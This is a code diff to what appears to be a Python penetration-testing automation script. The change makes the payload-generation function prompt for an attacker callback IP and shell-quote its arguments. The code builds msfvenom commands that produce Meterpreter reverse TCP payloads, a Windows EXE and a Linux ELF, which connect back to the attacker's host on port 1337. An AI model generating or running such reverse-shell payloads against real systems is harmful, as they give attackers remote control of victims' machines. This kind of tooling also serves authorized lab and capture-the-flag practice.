@@ -7,6 +7,7 @@
 # - The script will generate payloads using msfvenom based on the machine type. For Windows, it will generate a Meterpreter reverse TCP payload in EXE format, and for Linux, it will generate a Meterpreter reverse TCP payload in ELF format.
 
 import os
+import shlex
 import subprocess
 
 # ... [Previous functions: get_user_input, setup_directory_structure, install_tools, initial_nmap_scan]
@@ -45,7 +46,7 @@ def nmap_scan_choice(machine_ip, base_dir):
     except subprocess.CalledProcessError as e:
         print(f"Error during Nmap scan: {e}")
 
-def generate_payloads(machine_ip, machine_type, base_dir):
+def generate_payloads(machine_ip, machine_type, base_dir, lhost=None):
     """Generate payloads based on the machine type and Nmap scan results."""
     payloads_dir = os.path.join(base_dir, "payloads")
     if not os.path.exists(payloads_dir):
@@ -56,11 +57,20 @@ def generate_payloads(machine_ip, machine_type, base_dir):
         print("Error: msfvenom not found. Please install Metasploit Framework.")
         return
     
+    if not lhost:
+        lhost = input("Enter the attacker callback IP for LHOST: ").strip()
+    if not lhost:
+        print("Error: LHOST is required for reverse shell payloads.")
+        return
+
+    lhost_arg = shlex.quote(lhost)
+    payloads_dir_arg = shlex.quote(payloads_dir)
+
     # Determine which payloads to generate based on the machine type
     if machine_type == "Windows":
-        payload = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={machine_ip} LPORT=1337 -f exe > {payloads_dir}/windows_payload.exe"
+        payload = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost_arg} LPORT=1337 -f exe > {payloads_dir_arg}/windows_payload.exe"
     elif machine_type == "Linux":
-        payload = f"msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={machine_ip} LPORT=1337 -f elf > {payloads_dir}/linux_payload.elf"
+        payload = f"msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={lhost_arg} LPORT=1337 -f elf > {payloads_dir_arg}/linux_payload.elf"
     else:
         print("Unknown machine type. Cannot generate payload.")
         return
